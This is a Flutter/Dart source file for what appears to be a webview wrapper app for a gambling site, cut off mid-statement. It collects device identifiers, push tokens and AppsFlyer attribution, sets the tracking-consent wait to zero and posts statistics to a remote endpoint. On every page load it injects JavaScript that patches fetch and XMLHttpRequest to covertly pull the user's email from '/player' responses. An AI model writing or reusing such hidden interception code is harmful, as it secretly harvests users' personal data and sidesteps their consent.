import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math' as RetroKingMath;
import 'dart:ui';

import 'package:appsflyer_sdk/appsflyer_sdk.dart'
    show AppsFlyerOptions, AppsflyerSdk;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'
    show MethodCall, MethodChannel, SystemUiOverlayStyle;
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:timezone/data/latest.dart' as RetroKingTimezoneData;
import 'package:timezone/timezone.dart' as RetroKingTimezone;
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

// Если эти классы есть в main.dart – оставь импорт.
import 'main.dart' show MafiaHarbor, CaptainHarbor, BillHarbor;

// ============================================================================
// Retro KING инфраструктура
// ============================================================================

class RetroKingLogger {
  const RetroKingLogger();

  void RetroKingLogInfo(Object RetroKingMessage) =>
      debugPrint('[DressRetroLogger] $RetroKingMessage');

  void RetroKingLogWarn(Object RetroKingMessage) =>
      debugPrint('[DressRetroLogger/WARN] $RetroKingMessage');

  void RetroKingLogError(Object RetroKingMessage) =>
      debugPrint('[DressRetroLogger/ERR] $RetroKingMessage');
}

class RetroKingVault {
  static final RetroKingVault SharedInstance =
  RetroKingVault._InternalConstructor();

  RetroKingVault._InternalConstructor();

  factory RetroKingVault() => SharedInstance;

  final RetroKingLogger RetroKingLoggerInstance = const RetroKingLogger();
}

// ============================================================================
// Константы — строки в кавычках не меняем
// ============================================================================

const String RetroKingLoadedOnceKey = 'wheel_loaded_once';
const String RetroKingStatEndpoint = 'https://n1test-fish-mrb49.ondigitalocean.app/stat';
const String RetroKingCachedFcmKey = 'wheel_cached_fcm';

// ============================================================================
// Утилиты: RetroKingKit
// ============================================================================

class RetroKingKit {
  static bool RetroKingLooksLikeBareMail(Uri RetroKingUri) {
    final String RetroKingScheme = RetroKingUri.scheme;
    if (RetroKingScheme.isNotEmpty) return false;

    final String RetroKingRaw = RetroKingUri.toString();
    return RetroKingRaw.contains('@') && !RetroKingRaw.contains(' ');
  }

  static Uri RetroKingToMailto(Uri RetroKingUri) {
    final String RetroKingFull = RetroKingUri.toString();
    final List<String> RetroKingBits = RetroKingFull.split('?');
    final String RetroKingWho = RetroKingBits.first;

    final Map<String, String> RetroKingQuery = RetroKingBits.length > 1
        ? Uri.splitQueryString(RetroKingBits[1])
        : <String, String>{};

    return Uri(
      scheme: 'mailto',
      path: RetroKingWho,
      queryParameters: RetroKingQuery.isEmpty ? null : RetroKingQuery,
    );
  }

  static Uri RetroKingGmailize(Uri RetroKingMailUri) {
    final Map<String, String> RetroKingQp = RetroKingMailUri.queryParameters;

    final Map<String, String> RetroKingParams = <String, String>{
      'view': 'cm',
      'fs': '1',
      if (RetroKingMailUri.path.isNotEmpty) 'to': RetroKingMailUri.path,
      if ((RetroKingQp['subject'] ?? '').isNotEmpty)
        'su': RetroKingQp['subject']!,
      if ((RetroKingQp['body'] ?? '').isNotEmpty)
        'body': RetroKingQp['body']!,
      if ((RetroKingQp['cc'] ?? '').isNotEmpty) 'cc': RetroKingQp['cc']!,
      if ((RetroKingQp['bcc'] ?? '').isNotEmpty) 'bcc': RetroKingQp['bcc']!,
    };

    return Uri.https('mail.google.com', '/mail/', RetroKingParams);
  }

  static String RetroKingDigitsOnly(String RetroKingSource) =>
      RetroKingSource.replaceAll(RegExp(r'[^0-9+]'), '');
}

// ============================================================================
// Сервис открытия ссылок: RetroKingLinker
// ============================================================================

class RetroKingLinker {
  static Future<bool> RetroKingOpen(Uri RetroKingUri) async {
    try {
      if (await launchUrl(
        RetroKingUri,
        mode: LaunchMode.inAppBrowserView,
      )) {
        return true;
      }

      return await launchUrl(
        RetroKingUri,
        mode: LaunchMode.externalApplication,
      );
    } catch (RetroKingError) {
      debugPrint('DressRetroLinker error: $RetroKingError; url=$RetroKingUri');

      try {
        return await launchUrl(
          RetroKingUri,
          mode: LaunchMode.externalApplication,
        );
      } catch (_) {
        return false;
      }
    }
  }
}

// ============================================================================
// FCM Background Handler
// ============================================================================

@pragma('vm:entry-point')
Future<void> RetroKingFcmBackgroundHandler(
    RemoteMessage RetroKingMessage,
    ) async {
  debugPrint("Spin ID: ${RetroKingMessage.messageId}");
  debugPrint("Spin Data: ${RetroKingMessage.data}");
}

// ============================================================================
// RetroKingDeviceProfile
// ============================================================================

class RetroKingDeviceProfile {
  String? RetroKingDeviceId;
  String? RetroKingSessionId = 'wheel-one-off';
  String? RetroKingPlatformKind;
  String? RetroKingOsBuild;
  String? RetroKingAppVersion;
  String? RetroKingLocaleCode;
  String? RetroKingTimezoneName;
  bool RetroKingPushEnabled = true;

  Future<void> RetroKingInitialize() async {
    final DeviceInfoPlugin RetroKingInfoPlugin = DeviceInfoPlugin();

    if (Platform.isAndroid) {
      final AndroidDeviceInfo RetroKingAndroidInfo =
      await RetroKingInfoPlugin.androidInfo;

      RetroKingDeviceId = RetroKingAndroidInfo.id;
      RetroKingPlatformKind = 'android';
      RetroKingOsBuild = RetroKingAndroidInfo.version.release;
    } else if (Platform.isIOS) {
      final IosDeviceInfo RetroKingIosInfo =
      await RetroKingInfoPlugin.iosInfo;

      RetroKingDeviceId = RetroKingIosInfo.identifierForVendor;
      RetroKingPlatformKind = 'ios';
      RetroKingOsBuild = RetroKingIosInfo.systemVersion;
    }

    final PackageInfo RetroKingPackageInfo = await PackageInfo.fromPlatform();

    RetroKingAppVersion = RetroKingPackageInfo.version;
    RetroKingLocaleCode = Platform.localeName.split('_').first;
    RetroKingTimezoneName = RetroKingTimezone.local.name;
    RetroKingSessionId =
    'wheel-${DateTime.now().millisecondsSinceEpoch}';
  }

  Map<String, dynamic> RetroKingAsMap({String? RetroKingFcmToken}) =>
      <String, dynamic>{
        'fcm_token': RetroKingFcmToken ?? 'missing_token',
        'device_id': RetroKingDeviceId ?? 'missing_id',
        'app_name': 'retrotrickmaster',
        'instance_id': RetroKingSessionId ?? 'missing_session',
        'platform': RetroKingPlatformKind ?? 'missing_system',
        'os_version': RetroKingOsBuild ?? 'missing_build',
        'app_version': RetroKingAppVersion ?? 'missing_app',
        'language': RetroKingLocaleCode ?? 'en',
        'timezone': RetroKingTimezoneName ?? 'UTC',
        'push_enabled': RetroKingPushEnabled,
        "fthcashier": "true"
      };
}

// ============================================================================
// AppsFlyer шпион: RetroKingSpy
// ============================================================================

class RetroKingSpy {
  AppsFlyerOptions? RetroKingOptions;
  AppsflyerSdk? RetroKingSdk;

  String RetroKingAppsFlyerUid = '';
  String RetroKingAppsFlyerData = '';

  void RetroKingStart({VoidCallback? RetroKingOnUpdate}) {
    final AppsFlyerOptions RetroKingOpts = AppsFlyerOptions(
      afDevKey: 'qsBLmy7dAXDQhowM8V3ca4',
      appId: '6756072063',
      showDebug: true,
      timeToWaitForATTUserAuthorization: 0,
    );

    RetroKingOptions = RetroKingOpts;
    RetroKingSdk = AppsflyerSdk(RetroKingOpts);

    RetroKingSdk?.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    RetroKingSdk?.startSDK(
      onSuccess: () =>
          RetroKingVault().RetroKingLoggerInstance.RetroKingLogInfo(
            'WheelSpy started',
          ),
      onError: (RetroKingCode, RetroKingMsg) => RetroKingVault()
          .RetroKingLoggerInstance
          .RetroKingLogError('WheelSpy error $RetroKingCode: $RetroKingMsg'),
    );

    RetroKingSdk?.onInstallConversionData((RetroKingValue) {
      RetroKingAppsFlyerData = RetroKingValue.toString();
      RetroKingOnUpdate?.call();
    });

    RetroKingSdk?.getAppsFlyerUID().then((RetroKingValue) {
      RetroKingAppsFlyerUid = RetroKingValue.toString();
      RetroKingOnUpdate?.call();
    });
  }
}

// ============================================================================
// Мост для FCM токена: RetroKingFcmBridge
// ============================================================================

class RetroKingFcmBridge {
  final RetroKingLogger RetroKingLog = const RetroKingLogger();

  String? RetroKingToken;

  final List<void Function(String)> RetroKingWaiters =
  <void Function(String)>[];

  String? get RetroKingCurrentToken => RetroKingToken;

  RetroKingFcmBridge() {
    const MethodChannel('com.example.fcm/token')
        .setMethodCallHandler((MethodCall RetroKingCall) async {
      if (RetroKingCall.method == 'setToken') {
        final String RetroKingTokenString = RetroKingCall.arguments as String;

        if (RetroKingTokenString.isNotEmpty) {
          RetroKingSetToken(RetroKingTokenString);
        }
      }
    });

    RetroKingRestoreToken();
  }

  Future<void> RetroKingRestoreToken() async {
    try {
      final SharedPreferences RetroKingPrefs =
      await SharedPreferences.getInstance();

      final String? RetroKingCached =
      RetroKingPrefs.getString(RetroKingCachedFcmKey);

      if (RetroKingCached != null && RetroKingCached.isNotEmpty) {
        RetroKingSetToken(RetroKingCached, RetroKingNotify: false);
      }
    } catch (_) {}
  }

  Future<void> RetroKingPersistToken(String RetroKingNewToken) async {
    try {
      final SharedPreferences RetroKingPrefs =
      await SharedPreferences.getInstance();

      await RetroKingPrefs.setString(
        RetroKingCachedFcmKey,
        RetroKingNewToken,
      );
    } catch (_) {}
  }

  void RetroKingSetToken(
      String RetroKingNewToken, {
        bool RetroKingNotify = true,
      }) {
    RetroKingToken = RetroKingNewToken;
    RetroKingPersistToken(RetroKingNewToken);

    if (RetroKingNotify) {
      for (final void Function(String) RetroKingCallback
      in List<void Function(String)>.from(RetroKingWaiters)) {
        try {
          RetroKingCallback(RetroKingNewToken);
        } catch (RetroKingErr) {
          RetroKingLog.RetroKingLogWarn('fcm waiter error: $RetroKingErr');
        }
      }

      RetroKingWaiters.clear();
    }
  }

  Future<void> RetroKingWaitForToken(
      Function(String RetroKingTokenValue) RetroKingOnToken,
      ) async {
    try {
      await FirebaseMessaging.instance.requestPermission(
        alert: true,
        badge: true,
        sound: true,
      );

      if ((RetroKingToken ?? '').isNotEmpty) {
        RetroKingOnToken(RetroKingToken!);
        return;
      }

      RetroKingWaiters.add(RetroKingOnToken);
    } catch (RetroKingErr) {
      RetroKingLog.RetroKingLogError(
        'wheelWaitToken error: $RetroKingErr',
      );
    }
  }
}

// ============================================================================
// RetroKingLoader
// ============================================================================

class RetroKingLoader extends StatefulWidget {
  const RetroKingLoader({Key? key}) : super(key: key);

  @override
  State<RetroKingLoader> createState() => _RetroKingLoaderState();
}

class _RetroKingLoaderState extends State<RetroKingLoader>
    with SingleTickerProviderStateMixin {
  late AnimationController RetroKingController;

  static const Color RetroKingBackgroundColor = Color(0xFF05071B);

  @override
  void initState() {
    super.initState();

    RetroKingController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 3),
    )..repeat();
  }

  @override
  void dispose() {
    RetroKingController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      color: RetroKingBackgroundColor,
      child: AnimatedBuilder(
        animation: RetroKingController,
        builder: (BuildContext context, Widget? child) {
          final double RetroKingPhase =
              RetroKingController.value * 2 * RetroKingMath.pi;

          return CustomPaint(
            painter: RetroKingLoaderPainter(
              RetroKingPhase: RetroKingPhase,
            ),
            child: const SizedBox.expand(),
          );
        },
      ),
    );
  }
}

class RetroKingLoaderPainter extends CustomPainter {
  final double RetroKingPhase;

  RetroKingLoaderPainter({
    required this.RetroKingPhase,
  });

  @override
  void paint(Canvas RetroKingCanvas, Size RetroKingSize) {
    final double RetroKingWidth = RetroKingSize.width;
    final double RetroKingHeight = RetroKingSize.height;

    final Paint RetroKingBackgroundPaint = Paint()
      ..color = const Color(0xFF05071B)
      ..style = PaintingStyle.fill;

    RetroKingCanvas.drawRect(
      Offset.zero & RetroKingSize,
      RetroKingBackgroundPaint,
    );

    final double RetroKingPulse =
        (RetroKingMath.sin(RetroKingPhase) + 1) / 2;

    final Paint RetroKingCirclePaint = Paint()
      ..style = PaintingStyle.fill
      ..shader = RadialGradient(
        colors: <Color>[
          Colors.red.withOpacity(0.14 + 0.16 * RetroKingPulse),
          Colors.transparent,
        ],
      ).createShader(
        Rect.fromCircle(
          center: Offset(RetroKingWidth * 0.5, RetroKingHeight * 0.45),
          radius: RetroKingHeight * (0.4 + 0.15 * RetroKingPulse),
        ),
      );

    RetroKingCanvas.drawCircle(
      Offset(RetroKingWidth * 0.5, RetroKingHeight * 0.45),
      RetroKingHeight * (0.4 + 0.15 * RetroKingPulse),
      RetroKingCirclePaint,
    );

    final Paint RetroKingOuterPaint = Paint()
      ..style = PaintingStyle.fill
      ..shader = RadialGradient(
        colors: <Color>[
          Colors.redAccent.withOpacity(
            0.10 + 0.10 * (1 - RetroKingPulse),
          ),
          Colors.transparent,
        ],
      ).createShader(
        Rect.fromCircle(
          center: Offset(RetroKingWidth * 0.5, RetroKingHeight * 0.45),
          radius:
          RetroKingHeight * (0.55 + 0.10 * (1 - RetroKingPulse)),
        ),
      );

    RetroKingCanvas.drawCircle(
      Offset(RetroKingWidth * 0.5, RetroKingHeight * 0.45),
      RetroKingHeight * (0.55 + 0.10 * (1 - RetroKingPulse)),
      RetroKingOuterPaint,
    );

    final double RetroKingBaseSize = RetroKingWidth * 0.35;

    final double RetroKingFontSize =
        RetroKingBaseSize + RetroKingPulse * (RetroKingBaseSize * 0.15);

    final String RetroKingLetter = 'N';
    final String RetroKingWord = 'CUP';

    final TextPainter RetroKingLetterPainter = TextPainter(
      text: TextSpan(
        text: RetroKingLetter,
        style: TextStyle(
          fontSize: RetroKingFontSize,
          fontWeight: FontWeight.w900,
          color: Colors.red.shade600,
          letterSpacing: 4,
          shadows: <Shadow>[
            Shadow(
              color: Colors.redAccent.withOpacity(0.8),
              blurRadius: 22 + 18 * RetroKingPulse,
              offset: const Offset(0, 0),
            ),
            Shadow(
              color: Colors.black.withOpacity(0.8),
              blurRadius: 8,
              offset: const Offset(0, 4),
            ),
          ],
        ),
      ),
      textDirection: TextDirection.ltr,
    )..layout(maxWidth: RetroKingWidth);

    final double RetroKingLetterX =
        (RetroKingWidth - RetroKingLetterPainter.width) / 2;

    final double RetroKingLetterY =
        (RetroKingHeight - RetroKingLetterPainter.height) / 2;

    final Offset RetroKingLetterOffset = Offset(
      RetroKingLetterX,
      RetroKingLetterY,
    );

    final Rect RetroKingLetterRect = Rect.fromCenter(
      center: Offset(RetroKingWidth / 2, RetroKingHeight / 2),
      width: RetroKingLetterPainter.width * 1.4,
      height: RetroKingLetterPainter.height * 1.6,
    );

    final Paint RetroKingGlowPaint = Paint()
      ..maskFilter = MaskFilter.blur(
        BlurStyle.normal,
        28 + 24 * RetroKingPulse,
      )
      ..color = Colors.red.withOpacity(0.7 + 0.2 * RetroKingPulse);

    RetroKingCanvas.saveLayer(RetroKingLetterRect, RetroKingGlowPaint);
    RetroKingLetterPainter.paint(RetroKingCanvas, RetroKingLetterOffset);
    RetroKingCanvas.restore();

    RetroKingLetterPainter.paint(RetroKingCanvas, RetroKingLetterOffset);

    final double RetroKingCupFontSize = RetroKingWidth * 0.11;

    final TextPainter RetroKingCupPainter = TextPainter(
      text: TextSpan(
        text: RetroKingWord,
        style: TextStyle(
          fontSize: RetroKingCupFontSize,
          fontWeight: FontWeight.w600,
          color: Colors.red.shade100.withOpacity(0.95),
          letterSpacing: 5,
          shadows: <Shadow>[
            Shadow(
              color: Colors.redAccent.withOpacity(0.7),
              blurRadius: 12 + 10 * RetroKingPulse,
              offset: const Offset(0, 0),
            ),
          ],
        ),
      ),
      textDirection: TextDirection.ltr,
    )..layout(maxWidth: RetroKingWidth);

    final double RetroKingCupX =
        (RetroKingWidth - RetroKingCupPainter.width) / 2;

    final double RetroKingCupY = RetroKingLetterY +
        RetroKingLetterPainter.height +
        RetroKingHeight * 0.03;

    final Offset RetroKingCupOffset = Offset(
      RetroKingCupX,
      RetroKingCupY,
    );

    RetroKingCupPainter.paint(RetroKingCanvas, RetroKingCupOffset);
  }

  @override
  bool shouldRepaint(covariant RetroKingLoaderPainter RetroKingOldDelegate) =>
      RetroKingOldDelegate.RetroKingPhase != RetroKingPhase;
}

// ============================================================================
// Статистика
// ============================================================================

Future<String> RetroKingFinalUrl(
    String RetroKingStartUrl, {
      int RetroKingMaxHops = 10,
    }) async {
  final HttpClient RetroKingClient = HttpClient();

  try {
    Uri RetroKingCurrentUri = Uri.parse(RetroKingStartUrl);

    for (int RetroKingI = 0; RetroKingI < RetroKingMaxHops; RetroKingI++) {
      final HttpClientRequest RetroKingRequest =
      await RetroKingClient.getUrl(RetroKingCurrentUri);

      RetroKingRequest.followRedirects = false;

      final HttpClientResponse RetroKingResponse =
      await RetroKingRequest.close();

      if (RetroKingResponse.isRedirect) {
        final String? RetroKingLoc =
        RetroKingResponse.headers.value(HttpHeaders.locationHeader);

        if (RetroKingLoc == null || RetroKingLoc.isEmpty) break;

        final Uri RetroKingNextUri = Uri.parse(RetroKingLoc);

        RetroKingCurrentUri = RetroKingNextUri.hasScheme
            ? RetroKingNextUri
            : RetroKingCurrentUri.resolveUri(RetroKingNextUri);

        continue;
      }

      return RetroKingCurrentUri.toString();
    }

    return RetroKingCurrentUri.toString();
  } catch (RetroKingError) {
    debugPrint('wheelFinalUrl error: $RetroKingError');
    return RetroKingStartUrl;
  } finally {
    RetroKingClient.close(force: true);
  }
}

Future<void> RetroKingPostStat({
  required String RetroKingEvent,
  required int RetroKingTimeStart,
  required String RetroKingUrl,
  required int RetroKingTimeFinish,
  required String RetroKingAppSid,
  int? RetroKingFirstPageTs,
}) async {
  try {
    final String RetroKingResolvedUrl =
    await RetroKingFinalUrl(RetroKingUrl);

    final Map<String, dynamic> RetroKingPayload = <String, dynamic>{
      'event': RetroKingEvent,
      'timestart': RetroKingTimeStart,
      'timefinsh': RetroKingTimeFinish,
      'url': RetroKingResolvedUrl,
      'appleID': '6755681349',
      'open_count': '$RetroKingAppSid/$RetroKingTimeStart',
    };

    debugPrint('wheelStat $RetroKingPayload');

    final http.Response RetroKingResp = await http.post(
      Uri.parse('$RetroKingStatEndpoint/$RetroKingAppSid'),
      headers: <String, String>{
        'Content-Type': 'application/json',
      },
      body: jsonEncode(RetroKingPayload),
    );

    debugPrint(
      'wheelStat resp=${RetroKingResp.statusCode} body=${RetroKingResp.body}',
    );
  } catch (RetroKingError) {
    debugPrint('wheelPostStat error: $RetroKingError');
  }
}

// ============================================================================
// WebView-экран: RetroKingTableView
// ============================================================================

class RetroKingTableView extends StatefulWidget with WidgetsBindingObserver {
  String RetroKingStartingUrl;

  RetroKingTableView(this.RetroKingStartingUrl, {super.key});

  @override
  State<RetroKingTableView> createState() =>
      _RetroKingTableViewState(RetroKingStartingUrl);
}

class _RetroKingTableViewState extends State<RetroKingTableView>
    with WidgetsBindingObserver {
  _RetroKingTableViewState(this.RetroKingCurrentUrl);

  final RetroKingVault RetroKingVaultInstance = RetroKingVault();

  late InAppWebViewController RetroKingWebViewController;

  String? RetroKingPushToken;

  final RetroKingDeviceProfile RetroKingDeviceProfileInstance =
  RetroKingDeviceProfile();

  final RetroKingSpy RetroKingSpyInstance = RetroKingSpy();

  bool RetroKingOverlayBusy = false;

  String RetroKingCurrentUrl;

  DateTime? RetroKingLastPausedAt;

  bool RetroKingLoadedOnceSent = false;

  // Email extraction
  String? RetroKingCapturedEmail;
  Timer? RetroKingEmailPollTimer;

  static const String RetroKingInterceptScript = r"""
(function() {
  if (window.__retroKingHookInstalled) return;
  window.__retroKingHookInstalled = true;

  function tryExtract(url, bodyText) {
    try {
      if (url && url.indexOf('/player') !== -1) {
        var data = JSON.parse(bodyText);
        if (data && data.email) {
          window.__capturedEmail = data.email;
          window.flutter_inappwebview.callHandler('onPlayerData', data.email);
        }
      }
    } catch (e) {}
  }

  // Патчим fetch
  var origFetch = window.fetch;
  window.fetch = function() {
    var url = arguments[0];
    return origFetch.apply(this, arguments).then(function(response) {
      try {
        response.clone().text().then(function(text) {
          tryExtract(typeof url === 'string' ? url : url.url, text);
        });
      } catch (e) {}
      return response;
    });
  };

  // Патчим XMLHttpRequest
  var origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    this.__url = url;
    return origOpen.apply(this, arguments);
  };

  var origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function() {
    this.addEventListener('load', function() {
      try { tryExtract(this.__url, this.responseText); } catch (e) {}
    });
    return origSend.apply(this, arguments);
  };
})();
""";

  int? RetroKingFirstPageTimestamp;

  int RetroKingStartLoadTimestamp = 0;

  final Set<String> RetroKingExternalHosts = <String>{
    't.me',
    'telegram.me',
    'telegram.dog',
    'wa.me',
    'api.whatsapp.com',
    'chat.whatsapp.com',
    'bnl.com',
    'www.bnl.com',
    'facebook.com',
    'www.facebook.com',
    'm.facebook.com',
    'instagram.com',
    'www.instagram.com',
    'twitter.com',
    'www.twitter.com',
    'x.com',
    'www.x.com',
  };

  final Set<String> RetroKingExternalSchemes = <String>{
    'tg',
    'telegram',
    'whatsapp',
    'bnl',
    'fb-messenger',
    'sgnl',
    'tel',
    'mailto',
  };

  @override
  void initState() {
    super.initState();

    WidgetsBinding.instance.addObserver(this);
    FirebaseMessaging.onBackgroundMessage(RetroKingFcmBackgroundHandler);

    RetroKingFirstPageTimestamp = DateTime.now().millisecondsSinceEpoch;

    RetroKingInitPushAndGetToken();
    RetroKingDeviceProfileInstance.RetroKingInitialize();
    RetroKingWireForegroundPushHandlers();
    RetroKingBindPlatformNotificationTap();

    RetroKingSpyInstance.RetroKingStart(
      RetroKingOnUpdate: () {
        if (mounted) setState(() {});
      },
    );
  }

  @override
  void dispose() {
    RetroKingEmailPollTimer?.cancel();
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState RetroKingState) {
    if (RetroKingState == AppLifecycleState.paused) {
      RetroKingLastPausedAt = DateTime.now();
    }

    if (RetroKingState == AppLifecycleState.resumed) {
      if (Platform.isIOS && RetroKingLastPausedAt != null) {
        final DateTime RetroKingNow = DateTime.now();

        final Duration RetroKingDrift =
        RetroKingNow.difference(RetroKingLastPausedAt!);

        if (RetroKingDrift > const Duration(minutes: 25)) {
          RetroKingForceReloadToLobby();
        }
      }

      RetroKingLastPausedAt = null;
    }
  }

  void RetroKingForceReloadToLobby() {
    if (!mounted) return;

    WidgetsBinding.instance.addPostFrameCallback(
          (Duration RetroKingDuration) {
        if (!mounted) return;
      },
    );
  }

  // --------------------------------------------------------------------------
  // Push / FCM
  // --------------------------------------------------------------------------

  void RetroKingWireForegroundPushHandlers() {
    FirebaseMessaging.onMessage.listen((RemoteMessage RetroKingMsg) {
      if (RetroKingMsg.data['uri'] != null) {
        RetroKingNavigateTo(RetroKingMsg.data['uri'].toString());
      } else {
        RetroKingReturnToCurrentUrl();
      }
    });

    FirebaseMessaging.onMessageOpenedApp.listen(
          (RemoteMessage RetroKingMsg) {
        if (RetroKingMsg.data['uri'] != null) {
          RetroKingNavigateTo(RetroKingMsg.data['uri'].toString());
        } else {
          RetroKingReturnToCurrentUrl();
        }
      },
    );
  }

  void RetroKingNavigateTo(String RetroKingNewUrl) async {
    await RetroKingWebViewController.loadUrl(
      urlRequest: URLRequest(url: WebUri(RetroKingNewUrl)),
    );
  }

  void RetroKingReturnToCurrentUrl() async {
    Future<void>.delayed(const Duration(seconds: 3), () {
      RetroKingWebViewController.loadUrl(
        urlRequest: URLRequest(url: WebUri(RetroKingCurrentUrl)),
      );
    });
  }

  Future<void> RetroKingInitPushAndGetToken() async {
    final FirebaseMessaging RetroKingFm = FirebaseMessaging.instance;

    await RetroKingFm.requestPermission(
      alert: true,
      badge: true,
      sound: true,
    );

    RetroKingPushToken = await RetroKingFm.getToken();
  }

  // --------------------------------------------------------------------------
  // Привязка канала
  // --------------------------------------------------------------------------

  void RetroKingBindPlatformNotificationTap() {
    MethodChannel('com.example.fcm/notification')
        .setMethodCallHandler((MethodCall RetroKingCall) async {
      if (RetroKingCall.method == "onNotificationTap") {
        final Map<String, dynamic> RetroKingPayload =
        Map<String, dynamic>.from(RetroKingCall.arguments);

        debugPrint("URI from platform tap: ${RetroKingPayload['uri']}");

        final String? RetroKingUriString =
        RetroKingPayload["uri"]?.toString();

        if (RetroKingUriString != null &&
            !RetroKingUriString.contains("Нет URI")) {
          Navigator.pushAndRemoveUntil(
            context,
            MaterialPageRoute<Widget>(
              builder: (BuildContext RetroKingContext) =>
                  RetroKingTableView(RetroKingUriString),
            ),
                (Route<dynamic> RetroKingRoute) => false,
          );
        }
      }
    });
  }

  // --------------------------------------------------------------------------
  // UI
  // --------------------------------------------------------------------------

  @override
  Widget build(BuildContext context) {
    RetroKingBindPlatformNotificationTap();

    final bool RetroKingIsDark =
        MediaQuery.of(context).platformBrightness == Brightness.dark;

    return AnnotatedRegion<SystemUiOverlayStyle>(
      value: RetroKingIsDark
          ? SystemUiOverlayStyle.dark
          : SystemUiOverlayStyle.light,
      child: Scaffold(
        backgroundColor: Colors.black,
        body: Stack(
          children: <Widget>[
            InAppWebView(
              initialSettings: InAppWebViewSettings(
                javaScriptEnabled: true,
                disableDefaultErrorPage: true,
                mediaPlaybackRequiresUserGesture: false,
                allowsInlineMediaPlayback: true,
                allowsPictureInPictureMediaPlayback: true,
                useOnDownloadStart: true,
                javaScriptCanOpenWindowsAutomatically: true,
                useShouldOverrideUrlLoading: true,
                supportMultipleWindows: true,
              ),
              initialUrlRequest: URLRequest(
                url: WebUri(RetroKingCurrentUrl),
              ),
              onWebViewCreated:
                  (InAppWebViewController RetroKingController) {
                RetroKingWebViewController = RetroKingController;

                RetroKingWebViewController.addJavaScriptHandler(
                  handlerName: 'onServerResponse',
                  callback: (List<dynamic> RetroKingArgs) {
                    RetroKingVaultInstance.RetroKingLoggerInstance
                        .RetroKingLogInfo("JS Args: $RetroKingArgs");

                    try {
                      return RetroKingArgs.reduce(
                            (dynamic RetroKingV, dynamic RetroKingE) =>
                        RetroKingV + RetroKingE,
                      );
                    } catch (_) {
                      return RetroKingArgs.toString();
                    }
                  },
                );

                // Handler для email из /player
                RetroKingWebViewController.addJavaScriptHandler(
                  handlerName: 'onPlayerData',
                  callback: (List<dynamic> RetroKingArgs) {
                    final String? RetroKingEmail =
                        RetroKingArgs.isNotEmpty ? RetroKingArgs[0]?.toString() : null;
                    if (RetroKingEmail != null && RetroKingEmail.isNotEmpty) {
                      RetroKingCapturedEmail = RetroKingEmail;
                      RetroKingEmailPollTimer?.cancel();
                      debugPrint('==============================');
                      debugPrint('>>> PLAYER EMAIL CAPTURED: $RetroKingEmail');
                      debugPrint('==============================');
                    }
                  },
                );
              },
              onLoadStart: (
                  InAppWebViewController RetroKingController,
                  Uri? RetroKingUri,
                  ) async {
                RetroKingStartLoadTimestamp =
                    DateTime.now().millisecondsSinceEpoch;

                if (RetroKingUri != null) {
                  if (RetroKingKit.RetroKingLooksLikeBareMail(
                    RetroKingUri,
                  )) {
                    try {
                      await RetroKingController.stopLoading();
                    } catch (_) {}

                    final Uri RetroKingMailto =
                    RetroKingKit.RetroKingToMailto(RetroKingUri);

                    await RetroKingLinker.RetroKingOpen(
                      RetroKingKit.RetroKingGmailize(RetroKingMailto),
                    );

                    return;
                  }

                  final String RetroKingScheme =
                  RetroKingUri.scheme.toLowerCase();

                  if (RetroKingScheme != 'http' &&
                      RetroKingScheme != 'https') {
                    try {
                      await RetroKingController.stopLoading();
                    } catch (_) {}
                  }
                }
              },
              onLoadStop: (
                  InAppWebViewController RetroKingController,
                  Uri? RetroKingUri,
                  ) async {
                await RetroKingController.evaluateJavascript(
                  source: "console.log('Hello from Roulette JS!');",
                );

                // Внедряем перехватчик fetch/XHR для email
                await RetroKingController.evaluateJavascript(
                  source: RetroKingInterceptScript,
                );

                // Запускаем поллинг раз в минуту как запасной вариант
                RetroKingStartEmailPolling(RetroKingController);

                setState(() {
                  RetroKingCurrentUrl =
                      RetroKingUri?.toString() ?? RetroKingCurrentUrl;
                });

                Future<void>.delayed(const Duration(seconds: 20), () {
                  RetroKingSendLoadedOnce();
                });
              },
              shouldOverrideUrlLoading: (
                  InAppWebViewController RetroKingController,
                  NavigationAction RetroKingNav,
                  ) async {
                final Uri? RetroKingUri = RetroKingNav.request.url;

                if (RetroKingUri == null) {
                  return NavigationActionPolicy.ALLOW;
                }

                if (RetroKingKit.RetroKingLooksLikeBareMail(
                  RetroKingUri,
                )) {
                  final Uri RetroKingMailto =
                  RetroKingKit.RetroKingToMailto(RetroKingUri);

                  await RetroKingLinker.RetroKingOpen(
                    RetroKingKit.RetroKingGmailize(RetroKingMailto),
                  );

                  return NavigationActionPolicy.CANCEL;
                }

                final String RetroKingScheme =
                RetroKingUri.scheme.toLowerCase();

                if (RetroKingScheme == 'mailto') {
                  await RetroKingLinker.RetroKingOpen(
                    RetroKingKit.RetroKingGmailize(RetroKingUri),
                  );

                  return NavigationActionPolicy.CANCEL;
                }

                if (RetroKingScheme == 'tel') {
                  await launchUrl(
                    RetroKingUri,
                    mode: LaunchMode.externalApplication,
                  );

                  return NavigationActionPolicy.CANCEL;
                }

                final String RetroKingHost =
                RetroKingUri.host.toLowerCase();

                final bool RetroKingIsSocial =
                    RetroKingHost.endsWith('facebook.com') ||
                        RetroKingHost.endsWith('instagram.com') ||
                        RetroKingHost.endsWith('twitter.com') ||
                        RetroKingHost.endsWith('x.com');

                if (RetroKingIsSocial) {
                  await RetroKingLinker.RetroKingOpen(RetroKingUri);
                  return NavigationActionPolicy.CANCEL;
                }

                if (RetroKingIsExternalDestination(RetroKingUri)) {
                  final Uri RetroKingMapped =
                  RetroKingMapExternalToHttp(RetroKingUri);

                  await RetroKingLinker.RetroKingOpen(RetroKingMapped);

                  return NavigationActionPolicy.CANCEL;
                }

                if (RetroKingScheme != 'http' &&
